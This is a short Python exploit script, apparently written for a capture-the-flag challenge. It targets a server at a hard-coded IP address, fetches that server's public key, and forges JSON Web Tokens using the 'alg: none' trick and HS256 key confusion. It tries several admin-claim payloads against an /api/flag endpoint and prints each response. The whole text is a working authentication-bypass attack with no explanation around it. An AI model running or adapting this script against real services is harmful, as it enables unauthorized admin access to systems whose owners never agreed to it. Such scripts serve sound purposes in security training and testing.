import base64, json, hmac, hashlib, urllib.request
from urllib.error import HTTPError

base = "http://116.202.106.156:5008"

# Fetch server-shared public key text
pub = urllib.request.urlopen(base + "/jwks.json", timeout=10).read().decode()


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_none(payload):
    header = {"alg":"none","typ":"JWT"}
    return f"{b64url(json.dumps(header,separators=(',',':')).encode())}.{b64url(json.dumps(payload,separators=(',',':')).encode())}."


def make_hs256(payload, secret: bytes):
    header = {"alg":"HS256","typ":"JWT"}
    h = b64url(json.dumps(header,separators=(',',':')).encode())
    p = b64url(json.dumps(payload,separators=(',',':')).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"

payloads = [
    {"username":"admin","role":"admin"},
    {"user":"admin","role":"admin"},
    {"sub":"admin","role":"admin"},
    {"username":"admin","is_admin":True},
    {"admin":True},
]

candidates = []
for pl in payloads:
    candidates.append(("none", pl, make_none(pl)))
    candidates.append(("hs256_pubpem", pl, make_hs256(pl, pub.encode())))

for kind, pl, tok in candidates:
    req = urllib.request.Request(base + "/api/flag", headers={"Authorization": "Bearer " + tok})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode(errors="replace")
            print("OK", kind, pl, r.status, body)
    except HTTPError as e:
        body = e.read().decode(errors="replace")
        print("ERR", kind, pl, e.code, body)
    except Exception as e:
        print("EX", kind, pl, repr(e))
